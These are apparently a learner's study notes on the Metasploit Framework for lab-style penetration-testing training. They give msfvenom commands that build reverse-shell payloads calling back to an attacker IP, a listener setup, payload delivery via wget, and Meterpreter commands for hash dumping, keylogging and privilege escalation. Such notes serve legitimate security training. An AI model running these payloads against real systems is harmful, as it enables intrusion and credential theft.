Can facilitate all stages of engagement
Pro version adds automation and management of tasks
Metasploit Framework is the free CLI tool
- mfconsole- CLI
- Modules - exploits, scanners, payloads, etc
	- Auxiliary - scanners, crawlers, fuzzers
	- Encoders - bypass filters or AV signatures
	- Evasion - sophisticated attempts to bypass AVs
	- Exploits
	- NOPs - just no ops
	- Payloads
		- Adapters - wraps single payloads
		- Singles - self-contained payloads
		- Stagers - setting up connections to download later stages of the exploit
		- Stages - downloaded by stagers
	- Post - post exploitation
- Tools - standalone tools
An exploit is a piece of code that uses a vulnerability
A payload is used to get results when executing an exploit
# Console
`msfconsole`
Supports most Linux commands
Does not support output redirection (>)
Use `search` command to search for targets
- ex: `search type:auxiliary telnet`
- Use `info` to get info
`use` - use the specified module and load it as the context
`show options` - show configuration options of current module. Good practice to use this off the rip
Meterpreter - a payload. A meterpreter agent loads on the target system and connects back to you
`set <parameter> <value>`
`unset <parameter>` or `unset all`
`setg` and `unsetg` are used for defining and deleting global parameters that exist outside of the module context
`back` - leave module context
`exploit` - run current module. a.k.a. `run`
- -z - run in background
`check` - check if exploit will work on machine without actually running it, only sometimes available
CTRL+Z - send session to background
`sessions` - list active sessions
`sessions -i <session number>` - bring specified session to front
`unset payload` - unset payload
# Database
Metasploit db functions depend on postgresql to function
## Initialize/Delete DB
sudo -u postgres msfdb init
sudo -u postgres msfdb delete
`msf > db_status` - lists the status of the db in the msfconsole 
## Workspaces
`workspace` - lists workspaces
- `-h` - get help
- `-a` - creates a workspace
`db_nmap` - use like nmap, except the results get remembered
- `hosts` 
	- `-h` - get help
	- `-R` - add stored hosts value to `RHOSTS` parameter
- `services`
	- `-S` - search for specific services in the environment
# Low Hanging Fruits
- HTTP - lots of potential vulnerabilities
- FTP - could allow anonymous login
- SMB - SMB exploits like MS17-010
- SSH - default or easy to guess credentials
- RDP - weak credentials or Bluekeep
# Payloads
Payloads will have their own options, be sure to use `show options`!
`show payloads` - list payloads
`set payload` - choose payload
## msfvenom
Tool to help create standalone payloads for many different target systems in many different formats to send the payload via alternate methods and connect back via meterpreter
`msfvenom --list payloads`
- `| grep meterpreter` - list all meterpreter payloads
ex: generate a base64 encoded reverse shell in a raw format that will connect back to 10.10.186.44
- `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -p php/base64`
ex: generate a php file with a reverse shell
- `msfvenom -p php/reverse_php LHOST=10.10.186.44 LPORT=7777 -f raw > reverse_shell.php`
ex: generate an ELF for Linux machines
- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > reverse_shell.elf`
- `LHOST` is the attackbox IP and `LPORT` is the port you will have the handler listen on
Receive the reverse shell using *handlers*
- `use exploit/multi/handler`
	- Set `LHOST` and `LPORT` using attacker box settings
	- Set `PAYLOAD` to the type of payload that `msfvenom` generated
- Run the handler and wait for incoming connections
# Sessions
Once you have exploited a vulnerability and obtained a meterpreter reverse shell, you can run more exploits
Use CTRL+Z to background a session and get back to the msfconsole
# Getting Payloads on Victims
Host HTTP server (python -m http.server) and use wget to download the files
# Dump Hashes
Search for hashdump and the target platform to dump hashes of users
# Meterpreter
Runs in-memory, does not write itself to disk to avoid AVs which scan new files that are created on disk
Encrypts traffic with TLS to get past IPS and IDS systems which don't decrypt and inspect application data
Most AV software will detect it
Available on:
- Android
- iOS
- Java
- Linux
- OSX
- PHP
- Python
- Windows
Some exploits limit the meterpreter payloads you can use when not using msfvenom
`help` in the meterpreter repl will list all commands
`getuid` - get the owner of the current process
`ps` - list running processes
`migrate <pid>` - migrate Meterpreter to another process
- Careful when migrating to processes with less permissions
- `keyscan_start`, `keyscan_stop`, `keyscan_dump` - log keys send to that application
`hashdump` - on Windows, dump NTLM hashes for the current users
`search -f <filename>` - search for a filename (e.g. flag.txt)
`getsystem` - get system privileges
Convert normal shell to meterpreter: `post/multi/manage/shell_to_meterpreter`